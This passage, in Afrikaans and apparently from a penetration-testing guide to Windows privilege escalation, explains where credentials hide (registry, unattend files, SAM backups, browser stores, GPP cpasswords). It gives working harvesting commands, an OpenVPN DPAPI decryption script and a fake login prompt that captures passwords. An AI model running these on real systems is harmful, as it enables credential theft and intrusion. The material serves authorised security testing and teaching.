Die afsonderlike `Openfire\conf\openfire.xml`-lêer kan die admin-kons se opgestelde poorte en bindkoppelvlak openbaar, selfs wanneer ’n eksterne databasis gebruik word. Openfire bind sy admin-kons gewoonlik aan loopback; ’n plaaslike rekening kan steeds daardie adres bereik as die luisteraar loop. Gaan die werklike luisteraar, gemagtigde admin-rol, inprop-oplaaibeleid en Openfire-diensidentiteit saam na. ’n Admin wat ’n inprop kan installeer, kan veroorsaak dat inpropkode in die diens se konteks uitgevoer word, wat hoogs bevoorreg kan wees wanneer die diens as LocalSystem loop. ’n Ooreenstemmende rekeningwagwoord of ’n leesbare konfigurasiepad bewys nie op sigself toegang tot die admin-kons of kode-uitvoering nie. Sien die verskaffer se [gids vir installasie en inpropbestuur](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) en [API-eienskap vir inprop-oplaai](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfigurasie van forensiese bestuursbediener

Velociraptor-bedienerkonfigurasies, wat gewoonlik `server.config.yaml` genoem word, kan die interne CA se `CA.private_key` bevat. As ’n gebruiker met laer voorregte daardie sleutel kan lees, kan hulle moontlik ’n API-kliëntsertifikaat skep. Of dit tot hoër voorregte lei, hang af van die bediener se gebruikersrolle, API-bereikbaarheid en die identiteit waaronder die bediener of teikenagent loop. ’n Kliëntkonfigurasie bevat ander materiaal; die vind daarvan bewys nie toegang tot die bediener-CA nie. Sommige ontplooiings hou die CA-privaat sleutel vanlyn, dus kan ’n leesbare bedienerkonfigurasie ook nie die ondertekeningsleutel bevat nie.

Gaan op ’n Windows-bediener die ACL van die **bediener**-konfigurasie in sy installasiegids en enige beskermde rugsteunkopieë na. Een moontlike ligging is `%ProgramFiles%\VelociraptorServer\server.config.yaml`; gebruik die diens se opgestelde pad as dit verskil. Bevestig dat die huidige identiteit die lêer kan lees en dat `CA.private_key` werklik daarin voorkom. Vermy dit om die privaat sleutel in logs of enumerasie-uitvoer te druk. Die verskaffer se `config api_client`-werkvloei gebruik die CA-sleutel om ’n kliëntsertifikaat uit te reik, maar ’n effektiewe bedienerkantrol is ook nodig; om een te skep of te verander, kan datastoorskryftoegang of ’n herbegin vereis. ’n Bestaande bevoorregte bedieneridentiteit kan ’n roete bied selfs wanneer daardie skryftoegang ontbreek. API-navrae met uitvoeringsregte loop in die toepaslike bediener- of agentkonteks, wat hoogs bevoorreg kan wees.

Beskerm die bedienerkonfigurasie en rugsteunkopieë met beperkende ACL’s, hou die CA-ondertekeningsleutel waar moontlik vanlyn en beperk API-rolle en luisteraartoegang. Sien die [Velociraptor API-dokumentasie](https://docs.velociraptor.app/docs/server_automation/server_api/) en [riglyne vir sekuriteitskonfigurasie](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY is ’n aparte sessiebestuurder. Die oorspronklike geënkripteerde stoorplek kan by `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` wees, terwyl ’n uitgevoerde sessierugsteun `sessions-backup.dat` kan heet en elders gestoor kan word. [SolarWinds se uitvoergids](https://thwack.solarwinds.com/discussion/comment/115591) sê dat uitvoere met ’n wagwoord geënkripteer is en sessies, sleutels, skripte, merkers en verwantskappe kan bevat; die [ondersteuningsforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifiseer die oorspronklike stoorplek. Gaan eers die lêertoestemmings en paaie na. Die vind van enigeen van die lêers verklap nie die wagwoord nie en bewys nie dat enige gestoorde aanmeldbesonderheid steeds geldig is of hoër voorregte het nie.

### PuTTY SSH-gasheersleutels

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-sleutels in die register

SSH-private sleutels kan in die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy kyk of daar enigiets interessants daarin is:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

As jy enige inskrywing binne daardie pad vind, is dit waarskynlik ’n gestoorde SSH-sleutel. Dit word geïnkripteer gestoor, maar kan maklik gedekripteer word met [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek is hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties begin wanneer die stelsel opstart, voer uit:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om SSH-sleutels te skep, hulle met `ssh-add` by te voeg en via SSH by ’n masjien aan te meld. Die registerinskrywing HKCU\Software\OpenSSH\Agent\Keys bestaan nie, en procmon het nie die gebruik van `dpapi.dll` tydens die asimmetriese-sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Jy kan ook met **metasploit** na hierdie lêers soek: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- en SYSTEM-rugsteunkopieë

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Leesbare Windows Imaging (`.wim`)-rugsteunlêers kan ook offline `SAM`-, `SECURITY`- en `SYSTEM`-registerkorwe bevat. Gee voorkeur aan plaaslik toeganklike rugsteun- of beeldgidse en ondersoek ’n beeld se **lidname** voordat jy enigiets uittrek; ’n `.wim`-lêernaam alleen bewys nie dat registerkorwe blootgestel is nie, en gewone `install.wim`-, `boot.wim`- en herstelbeelde is algemene vals leidrade. ’n SMB-deel is ’n afsonderlike toegangspad en moet slegs nagegaan word wanneer daardie deel binne die bestek val. Sien Microsoft se [Windows-beeldriglyne](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) en [verwysing oor registerkorflêers](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Wolkbewyse

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Soek na ’n lêer genaamd **SiteList.xml**

### Gecachede GPP-wagwoord

’n Funksie was voorheen beskikbaar wat die ontplooiing van pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences (GPP) moontlik gemaak het. Hierdie metode het egter beduidende sekuriteitsfoute gehad. Eerstens kon enige domeingebruiker toegang kry tot die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is. Tweedens kon enige geverifieerde gebruiker die wagwoorde in hierdie GPPs, wat met AES256 en ’n publiek gedokumenteerde versteksleutel geënkripteer is, dekripteer. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers verhoogde voorregte kon gee.

Om hierdie risiko te beperk, is ’n funksie ontwikkel om te soek na plaaslik gekasde GPP-lêers wat ’n nie-leë "cpassword"-veld bevat. Wanneer so ’n lêer gevind word, dekripteer die funksie die wagwoord en gee ’n pasgemaakte PowerShell-objek terug. Hierdie objek bevat besonderhede oor die GPP en die lêer se ligging, wat help om hierdie sekuriteitskwesbaarheid te identifiseer en reg te stel.

Soek na hierdie lêers in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Gebruik crackmapexec om die wagwoorde te verkry:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Voorbeeld van web.config met aanmeldbesonderhede:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Rugsteunargiewe in ’n IIS-webroot

’n Ou ZIP-rugsteun wat direk in ’n bediende webroot geplaas is, kan vorige konfigurasielêers en herbruikbare aanmeldbesonderhede blootlê. Gaan die webwerf se opgestelde fisiese pad na, en kyk of die argief werklik oor HTTP bereikbaar is voordat jy dit as ’n blootstelling beskou. Die verstekpad `C:\inetpub\wwwroot` is slegs ’n moontlikheid. ’n Vinnige plaaslike inventaris kan name en groottes lys sonder om argiewe oop te maak:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

’n Argiefnaam bewys nie dat dit ’n geheim bevat of dat ’n herwonne aanmeldbewys hoër voorregte verleen nie.

### OpenVPN-aanmeldbesonderhede

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials of selfs die credentials van ’n ander gebruiker in te voer** as jy dink hy ken hulle (let daarop dat dit regtig **riskant** is om die kliënt direk vir die **credentials** te **vra**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Moontlike lêername wat aanmeldbesonderhede bevat**

Bekende lêers wat ’n ruk gelede **wagwoorde** in **gewone teks** of **Base64** bevat het

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Lêernaamlysvariant sonder die Password Safe-uitbreiding

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-databasisse gebruik gewoonlik die `.psafe3`-uitbreiding. Behandel ’n ooreenstemmende lêernaam as ’n kandidaat vir ’n geïnkripteerde kluis; die teenwoordigheid daarvan bewys nie dat jy dit kan lees, ontsluit of enige gestoorde aanmeldbewyse kan gebruik nie. Gaan toeganklike gebruikersprofiele en gekonfigureerde lêerdelingwortels na wanneer jy ondersoek waar sulke lêers gestoor word.

’n Leesbare KeePass `.kdbx` is eweneens net ’n leidraad na ’n geïnkripteerde kluis. Om dit te ontsluit, vereis die werklike hoofwagwoord en enige gekonfigureerde sleutellêer- of rekeningfaktore. As ’n gemagtigde ondersoek ’n LM:NT-hashpaar in ’n inskrywing vind, bevestig die genoemde rekening en of die NT-hash tans geldig is en deur die teiken se NTLM-diens aanvaar word voordat jy [pass-the-hash](../ntlm/README.md#pass-the-hash) oorweeg. ’n Kluisinskrywing verleen nie vanself Administrator- of SYSTEM-regte nie; afstandtoegang tot dienste, rekeningregte en enige afsonderlike diensuitvoeringstap moet ook beskikbaar wees. Die inventaris moet die kluis se pad en leesbaarheid rapporteer, nie die databasis of gestoorde aanmeldbewyse vertoon nie.

Soek in al die voorgestelde lêers:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Soekopdrag-variant sonder die Password Safe-uitbreiding

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geloofsbriewe in die RecycleBin

Jy moet ook die Asblik nagaan vir geloofsbriewe

Gaan toeganklike inskrywings in die Asblik na vir geskrapte rugsteunlêers en konfigurasie-argiewe, asook lêers waarvan die name uitdruklik na geloofsbriewe verwys. ’n Nuttige `.7z`-, `.zip`- of `.rar`-rugsteunlêer kan maande oud wees en ’n gewone lêernaam hê. Windows stoor die oorspronklike pad en uitveetyd in ’n `$I`-rekord, en die geskrapte lêer as die gepaarde `$R`-inskrywing; ondersoek die metadata en die huidige identiteit se leestoegang voordat jy ’n argief oopmaak. Sigbaarheid hang af van die volume, gebruiker-SID en lêertoestemmings, dus bewys ’n leë lys nie dat daar geen herwinbare rugsteunlêer bestaan nie. Beskou ’n argiefnaam as ’n kandidaat vir ondersoek, nie as bewys dat dit ’n geldige geheim bevat nie.

’n Toeganklike geskrapte `.pfx`-lêer kan ook ’n leidraad vir **code-signing** wees. As dit ’n toeganklike private sleutel bevat, kan die sleutel ’n gewysigde PowerShell-skrip onderteken; [PowerShell vereis ’n code-signing-sertifikaat met ’n private sleutel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), en [AppLocker-uitgewerreëls evalueer die ondertekenaar se identiteit en reëlomvang](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Uitvoering oor rekeninggrense heen vereis dat die huidige identiteit die presiese skrip kan wysig, dat ’n effektiewe reël die gevolglike handtekening vir die skrip en teikenrekening aanvaar, en dat ’n geskeduleerde taak of ander verbruiker met hoër voorregte dit werklik uitvoer. ’n `.pfx`-lêernaam, sertifikaatonderwerp of skryfbare skrip alleen bewys nie dat hierdie ketting bestaan nie. Gaan die metadata, ACL’s, beleid en geskeduleerde opdrag na voordat jy private-sleutelmateriaal oopmaak of die taak aktiveer.

Gaan ook toeganklike profieldatabasisse van boodskapkliënte, notas en ontvangde lêers na vir leidrade oor geloofsbriewe. ’n BitLocker-herwinningsleuteluitvoer kan as HTML of TXT gestoor wees, soms binne ’n benoemde rugsteunargief. Sulke materiaal kan toegang bied tot ’n afsonderlike geënkripteerde datavolume wat ouer rugsteunlêers bevat; ondersoek die volume en argief slegs wanneer toegang gemagtig is. As ’n rugsteunlêer `NTDS.dit` bevat, vereis herwinning van domeingeloofsbriewe vanlyn ook die ooreenstemmende `SYSTEM`-korf, soos beskryf in die [werkvloei vir rugsteun en bevoorregte groepe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Lêername en ’n geslote volume alleen bewys nie dat ’n bruikbare herwinningsleutel of domeinrugsteun bestaan nie.

Om wagwoorde wat deur verskeie programme gestoor is te **herwin**, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met geloofsbriewe**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Onttrek OpenSSH-sleutels uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir databasisse waarin wagwoorde van **Chrome of Firefox** gestoor word.\
Jy moet kyk vir databasisse waarin wagwoorde van **Chrome, Edge of Firefox** gestoor word.\
Kyk ook na die blaaiergeskiedenis, boekmerke en gunstelinge, aangesien daar moontlik **wagwoorde gestoor is**.

Vir die huidige gebruiker se gewone Edge-profiel **Default** is `Login Data` in `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, terwyl `Local State` in die ouer `User Data`-gids is. [Microsoft dokumenteer die verstekprofieflokasie](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); 'n ander profiel of 'n `UserDataDir`-beleid kan dit verskuif. Die teenwoordigheid van die lêer is net 'n leidraad na 'n geloofsbriewewinkel: bevestig dat die lêers leesbaar is, dat jy toegang tot die toepaslike gebruiker se DPAPI-konteks of ander gemagtigde sleutelmateriaal het, en dat 'n gestoorde aanmelding aan 'n rekening met hoër voorregte behoort. Om slegs paaie te lys, hoef nie die databasis oop te maak of gedekripteerde wagwoorde te vertoon nie.

Vir Firefox dokumenteer [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) dat `key4.db` en `logins.json` in 'n profiel die gepaarde lêers vir die sleutel en geënkripteerde aanmeldings is. Die teenwoordigheid daarvan is net 'n leidraad: kyk of albei lêers leesbaar is, of gestoorde inskrywings bestaan, en of 'n Primary Password die sleutel beskerm voordat jy besluit dat die geloofsbriewe bruikbaar is. As 'n herwonne geloofsbrief aan 'n domeinrekening behoort, hersien daardie rekening se effektiewe groepbeheerregte en die groep se [LAPS-wagwoordlees- of dekripteringsregte](../active-directory-methodology/laps.md) afsonderlik; blaaierartefakte alleen bewys nie dat daar 'n pad na administrateurregte is nie.

Gereedskap om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie wat in die Windows-bedryfstelsel ingebou is en **interkommunikasie** tussen sagtewarekomponente van verskillende tale moontlik maak. Elke COM-komponent word **deur 'n klas-ID (CLSID) geïdentifiseer**, en elke komponent stel funksionaliteit via een of meer koppelvlakke beskikbaar, wat deur koppelvlak-ID's (IIDs) geïdentifiseer word.

COM-klasse en -koppelvlakke word onderskeidelik in die register onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** gedefinieer. Hierdie register word geskep deur **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** saam te voeg = **HKEY\CLASSES\ROOT.**

Binne die CLSID's van hierdie register kan jy die kindregister **InProcServer32** vind, wat 'n **verstekwaarde** bevat wat na 'n **DLL** wys, en 'n waarde genaamd **ThreadingModel**, wat **Apartment** (enkelthreaded), **Free** (multithreaded), **Both** (enkel- of multithreaded) of **Neutral** (threadneutraal) kan wees.

![Blaaiergeskiedenis - COM DLL Overwriting: Binne die CLSID's van hierdie register kan jy die kindregister InProcServer32 vind, wat 'n verstekwaarde bevat wat na 'n DLL wys, en 'n waarde...](<../../images/image (729).png>)

Basies, as jy enige van die **DLL's wat uitgevoer gaan word, kan oorskryf**, kan jy **voorregte eskaleer** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

Lees hier hoe aanvallers COM Hijacking as 'n volhardingsmeganisme gebruik:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Algemene wagwoordsoektog in lêers en register**

**Soek na lêerinhoud**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Soek na ’n lêer met ’n spesifieke lêernaam**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Soek die register vir sleutelname en wagwoorde**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Nutsgoed wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is ’n msf-inprop. Ek het hierdie inprop geskep om outomaties elke Metasploit POST-module uit te voer wat na credentials op die slagoffer se stelsel soek.**\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers met wagwoorde wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog ’n uitstekende hulpmiddel om wagwoorde uit ’n stelsel te onttrek.

Die hulpmiddel [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **gebruikersname** en **wagwoorde** vir verskeie hulpmiddels wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stel jou voor dat **’n proses wat as SYSTEM loop ’n nuwe proses** (`OpenProcess()`) **met volle toegang oopmaak**. Dieselfde proses **skep ook ’n nuwe proses** (`CreateProcess()`) **met lae voorregte, maar dit erf al die oop handles van die hoofproses**.\
As jy dan **volle toegang tot die proses met lae voorregte het**, kan jy die **oop handle na die bevoorregte proses wat met** `OpenProcess()` **geskep is, bekom en** ’n **shellcode daarin inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander plasing vir ’n vollediger verduideliking van hoe om meer oop handles van prosesse en threads wat met verskillende toestemmingsvlakke geërf is, te toets en te misbruik (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, waarna as **pipes** verwys word, maak kommunikasie tussen prosesse en data-oordrag moontlik.

Windows bied ’n funksie genaamd **Named Pipes**, waarmee onverwante prosesse data kan deel, selfs oor verskillende netwerke. Dit is soortgelyk aan ’n kliënt-/bedienerargitektuur, met rolle wat as **named pipe server** en **named pipe client** gedefinieer word.

Wanneer ’n **kliënt** data deur ’n pipe stuur, kan die **bediener** wat die pipe opgestel het, **die identiteit van die kliënt aanneem**, mits dit die nodige **SeImpersonate**-regte het. As jy ’n **bevoorregte proses** identifiseer wat deur ’n pipe kommunikeer wat jy kan naboots, kan jy **hoër voorregte verkry** deur die identiteit van daardie proses aan te neem wanneer dit met die pipe wat jy opgestel het, kommunikeer. Nuttige gidse oor hoe om so ’n aanval uit te voer, is [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

